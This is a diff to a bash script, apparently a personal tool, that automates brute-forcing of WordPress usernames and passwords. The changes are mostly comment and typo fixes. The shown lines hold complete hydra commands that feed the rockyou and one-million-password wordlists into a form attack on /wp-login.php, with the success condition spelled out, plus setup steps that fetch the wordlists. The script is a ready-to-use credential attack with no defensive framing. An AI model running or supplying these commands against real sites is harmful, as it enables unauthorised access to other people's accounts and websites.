@@ -1,7 +1,7 @@
 #!/bin/bash
 #
 # Author: Joseph Hurley
-# Purpose: Password brute-forcing
+# Purpose: Password & Username brute-forcing on Wordpress
 
 # ANSI escape Codes (for colored output, -e required on echo)
 RED='\033[0;31m'
@@ -51,11 +51,11 @@ gzip -d ~/wpbruteforcer/wordlists/rockyou.txt.gz
 rm ~/wpbruteforcer/wordlists/rockyou.txt.gz
 }
 
-# brute-force using both a username & a password worlist
+# brute-force using both a username & a password wordlist
 hydrausernamewordlist () {
 if [ "$REPLY" == 1 ]; then 
     echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
-    hydra -L "$USERNAMELIST" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+    hydra -L "$USERNAMELIST" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard' # last string specifies error message, cookie and destination (S=dashboard is destination)
 else
     echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
     hydra -L "$USERNAMELIST" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
@@ -63,7 +63,7 @@ else
 fi
 }
 
-# brute-force using specified username & a password worlist
+# brute-force using specified username & a password wordlist
 hydraspecificusername () {
     if [ "$REPLY" == 1 ]; then 
     echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
@@ -85,7 +85,7 @@ read -r NETWORKADDRESS
 getpwwordlist () {
     echo -e "$GREEN""select the password wordlist you would like to use\n""$NC"
     select d in rockyou.txt 1milpwlist.txt; 
-    do test -n "$d" && break; 
+    do test -n "$d" && break; # sends error message if answer is invalid
     echo -e "$RED>>> Invalid Selection""$NC"; done
 }
 
